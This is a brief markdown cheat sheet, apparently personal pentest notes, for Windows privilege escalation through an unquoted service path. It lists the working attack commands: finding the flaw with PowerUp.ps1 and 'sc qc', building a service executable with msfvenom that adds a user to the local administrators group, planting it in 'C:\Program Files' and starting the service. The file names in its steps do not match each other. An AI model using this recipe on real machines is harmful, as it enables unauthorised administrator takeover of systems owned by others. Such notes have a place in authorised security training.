# Unquoted Service Path Escalation

* Run Powerup.ps1 (Example unquoted path -> C:\I\AM\VULNERABLE IT DOESN'T HAS "" Like "C:\I\AM\VULNERABLE" )
* sc qc Service
* If you notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

## kali
* msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o The_same_name_as_path_or_executable_on_windows.exe
* Copy the generated file, The_same_name_as_path_or_executable_on_windows.exe, to Windows

## Windows
* Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
* Open command prompt and type: sc start service
* net localgroup administrators
